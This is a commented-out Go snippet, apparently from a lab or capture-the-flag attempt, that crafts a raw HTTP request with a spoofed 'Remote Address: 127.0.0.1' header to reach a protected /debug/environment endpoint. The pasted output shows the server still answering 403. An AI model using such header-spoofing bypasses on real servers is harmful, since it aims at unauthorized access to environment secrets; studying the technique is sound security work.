	// conn, err := net.Dial("tcp", vulnerableURL)
	// if err != nil {
	// 	fmt.Println("Error connecting to the server:", err)
	// 	return
	// }
	// defer conn.Close()

// define the HTTP request with custom Remote Address header
	// // for SSRF
	// httpRequest := "GET " + serverEndpoint + " HTTP/1.1\r\n" +
	// 	"Accept: */* \r\n" +
	// 	"Host: " + serverHost + "\r\n" +
	// 	"User-Agent: CustomTCPClient\r\n" +
	// 	"Remote Address: 127.0.0.1\r\n" +
	// 	"Connection: close\r\n\r\n"

	// fmt.Printf("request: %v\n", httpRequest)

	// // send the HTTP request to the server
	// _, err = conn.Write([]byte(httpRequest))
	// if err != nil {
	// 	fmt.Println("Error sending the request:", err)
	// 	return
	// }

	// // read the HTTP response from the server
	// buffer := make([]byte, 1024)
	// for {
	// 	n, err := conn.Read(buffer)
	// 	if err != nil {
	// 		fmt.Println("Error reading the response:", err)
	// 		return
	// 	}
	// 	if n == 0 {
	// 		break
	// 	}
	// 	// rrocess and print the response data
	// 	fmt.Print(string(buffer[:n]))
	// }

// so far here's what I'm getting back from the server:

// request: GET /debug/environment HTTP/1.1
// Accept: */*
// Host: xxx.xxx.xxx.xxx
// User-Agent: CustomTCPClient
// Remote Address: 127.0.0.1
// Connection: close

// HTTP/1.1 403 FORBIDDEN
// Server: Werkzeug/3.0.0 Python/3.12.0
// Date: Tue, 31 Oct 2023 11:49:56 GMT
// Content-Type: application/json
// Content-Length: 24
// Connection: close

// {"error":"Not Allowed"}
// Error reading the response: EOF

// for some reason it's still triggering the 403.